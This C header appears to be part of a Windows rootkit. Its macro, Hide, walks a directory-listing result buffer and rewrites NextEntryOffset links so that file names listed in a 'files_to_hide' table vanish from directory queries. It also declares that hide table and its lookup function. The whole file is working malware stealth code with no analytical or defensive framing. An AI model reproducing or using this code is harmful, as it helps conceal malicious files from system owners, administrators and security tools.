
#pragma once

#define Attrib(TYPE, entry, attrib) ((TYPE*)entry)->attrib

#define Hide(TYPE, curr, prev, FileInformation, FileInformationBufferSize)                              \
        curr = FileInformation;                                                                         \
        prev = curr;                                                                                    \
                                                                                                        \
        if( 0 == Attrib(TYPE, curr, NextEntryOffset) &&                                                 \
            is_in_files_to_hide((WCHAR*)&(Attrib(TYPE, curr, FileName)),\
                                Attrib(TYPE, curr, FileNameLength)) )\
        {                                                                                               \
            return ( STATUS_NO_MORE_FILES );                                                                \
        }                                                                                               \
                                                                                                        \
        prev = curr;                                                                                    \
        curr += Attrib(TYPE, curr, NextEntryOffset);                                                    \
                                                                                                        \
        while(1)                                                                                        \
        {                                                                                               \
            if ( is_in_files_to_hide((WCHAR*)&(Attrib(TYPE, curr, FileName)),\
                                     Attrib(TYPE, curr, FileNameLength)) )                         \
            {                                                                                           \
                if ( 0 == Attrib(TYPE, curr, NextEntryOffset) )                                         \
                {                                                                                       \
                    Attrib(TYPE, prev, NextEntryOffset) = 0;                                            \
                    break;                                                                              \
                }                                                                                       \
                else                                                                                    \
                    Attrib(TYPE, prev, NextEntryOffset) += Attrib(TYPE, curr, NextEntryOffset);         \
            }                                                                                           \
            else\
            {\
                prev = curr;\
            }\
\
            if( 0 != Attrib(TYPE, curr, NextEntryOffset) )\
                curr = curr + Attrib(TYPE, curr, NextEntryOffset);\
            else\
                break;\
        }

typedef struct FileHideEntry
{
    size_t file_name_len;
    WCHAR  file_name[24];
} s_FileHideEntry;

extern s_FileHideEntry files_to_hide[];

int is_in_files_to_hide(WCHAR *name, ULONG name_len);
